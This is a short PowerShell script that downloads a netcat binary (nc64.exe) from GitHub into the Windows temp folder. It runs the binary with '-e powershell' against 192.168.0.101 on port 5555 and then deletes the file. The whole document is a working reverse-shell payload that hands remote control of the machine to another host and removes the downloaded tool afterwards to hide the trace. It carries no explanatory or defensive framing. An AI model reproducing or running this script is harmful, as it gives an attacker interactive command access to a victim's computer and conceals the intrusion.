# Define the URL to download the executable
$url = 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe'

# Define the temporary directory
$tempDir = [System.IO.Path]::GetTempPath()

# Combine the temporary directory with the desired filename
$output = Join-Path -Path $tempDir -ChildPath 'nc64.exe'

# Download the executable from the URL to the temporary directory
Invoke-WebRequest -Uri $url -OutFile $output

# Execute the downloaded executable with specified parameters
& $output '192.168.0.101' '5555' '-e' 'powershell'

# Remove the downloaded executable
Remove-Item -Path $output
